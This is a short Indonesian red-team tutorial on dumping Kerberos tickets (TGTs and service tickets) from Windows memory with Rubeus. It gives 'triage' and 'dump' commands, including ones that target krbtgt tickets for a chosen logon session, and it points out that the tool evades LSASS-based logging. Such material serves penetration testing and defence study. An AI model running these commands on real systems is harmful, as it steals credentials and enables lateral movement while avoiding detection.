---
title: '[Credential Theft] Extracting Kerberos Tickets'
date: 2023-07-29 11:11:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, credential theft, mimikatz, cobalt strike, kerberos]     # TAG names should always be lowercase
author: nairpaa
---

Tiket Kerberos adalah bagian penting dari protokol otentikasi Kerberos, yang digunakan oleh banyak sistem operasi untuk otentikasi jaringan. 

Salah satu konsekuensi yang tidak menguntungkan dari teknik-teknik [Credential Thieft](/posts/credential-theft/) sebelumnya adalah dapat diaudit dan di-*log* dengan mudah.

Oleh karena itu, *tool* [Rubeus]() yang dirancang khusus untuk interaksi dan penyalahgunaan Kerberos dapat menjadi lebih berguna karena menggunakan API Windows yang *legit*.

## 0x1 - Exploitation Stages

Perintah `triage` pada Rubeus akan menampilkan semua tiket Kerberos dalam sesi *logon* user saat ini dan jika dijalankan sebagai administrator akan menampilkan semua sesi *logon* di mesin.

```powershell
PS > .\Rubeus.exe triage
```

Keterangan:
- Setiap pengguna memiliki sesi *logon* mereka sendiri, yang diwakili oleh **LUID** (*locally unique identifier*).
- Tiket untuk *service* krbtgt adalah **Ticket Granting Tickets (TGTs)** dan lainnya (ldap, http, cifs, dll) adalah **Ticket Granting Service Tickets (TGSs)**. Jenis tiket yang ini akan dijelaskan lebih detail di materi [Kerberos](/posts/intro-to-kerberos).

Perintah `dump` Rubeus akan mengekstrak tiket tersebut dari memori. Karena menggunakan WinAPIs, tidak perlu membuka *handle* mencurigakan ke LSASS. 

```powershell
PS > .\Rubeus.exe dump # dump semua tiket
PS > .\Rubeus.exe dump /luid:0x123ab /service:krbtgt # dump spesifik tiket
PS > .\Rubeus.exe dump /luid:0x123ab /service:krbtgt /nowrap # menghasilkan base64 dalam satu baris
```

Perintah tersebut akan menghasilkan tiket dalam format base64.

---

## 0x2 - References

- https://github.com/GhostPack/Rubeus
- https://specterops.gitbook.io/ghostpack/rubeus/ticket-extraction-and-harvesting